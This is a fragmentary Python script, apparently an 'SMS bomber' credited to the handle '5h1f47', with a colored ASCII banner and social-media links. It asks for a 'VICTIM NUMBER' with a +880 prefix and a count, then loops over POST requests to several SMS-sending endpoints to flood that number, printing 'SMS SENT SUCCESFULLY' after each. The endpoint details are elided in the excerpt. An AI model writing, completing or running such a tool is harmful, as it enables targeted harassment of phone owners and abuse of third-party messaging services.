...
\033[1;32m[-] AUTHOR    :\033[1;32m Shifat
\033[1;32m[-] GITHUB    :\033[1;32m 5h1f47
\033[1;32m[-] FACEBOOK  :\033[1;32m Shifat Zaman
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH 5h1f47 ;) {w}<{r}/{w}>\n\n")
...
os.system("xdg-open https://www.facebook.com/profile.php?id=100086006552854")
print (logo)
print(f"""\n{ran}\033[1;31m                                                               
\t\033[1;32m███████╗██╗      ██╗██╗███████╗   █████╗   ████████╗
\t\033[1;32m██╔════╝██║      ██║██║██╔════╝██╔══██╗╚══██╔══╝
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥5h1f47🔥 "+w+tim)
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥5h1f47🔥 "+w+tim)
	resp21 = requests.post(url22, headers=headers22, data=data22)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥5h1f47🔥 "+w+tim)
	resp21 = requests.post(url23, headers=headers23, data=data23)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥5h1f47🔥 "+w+tim)
	resp21 = requests.post(url24, headers=headers24, data=data24)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥5h1f47🔥 "+w+tim)
